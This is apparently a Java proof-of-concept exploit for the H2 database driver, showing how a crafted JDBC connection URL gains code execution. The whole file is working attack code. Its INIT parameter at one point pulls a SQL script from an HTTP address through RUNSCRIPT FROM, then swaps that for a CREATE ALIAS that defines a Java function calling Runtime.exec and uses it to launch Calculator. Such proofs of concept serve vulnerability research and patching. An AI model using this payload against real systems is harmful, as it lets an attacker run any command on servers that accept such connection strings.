package com.trganda.h2.poc;

import java.sql.Connection;
import java.sql.DriverManager;

public class SQLGadget {
    public static void main(String[] args) throws Exception {
        Class.forName("org.h2.Driver");

        String payload = "INIT=RUNSCRIPT FROM 'http://127.0.0.1:8001/poc.sql'";
        payload =
                "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"trganda\"\\;}'\\;CALL EXEC ('open -a Calculator.app')";

        String connectionUrl =
                "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;" + payload;

        Connection connection = DriverManager.getConnection(connectionUrl, "sa", "");
        connection.close();
    }
}
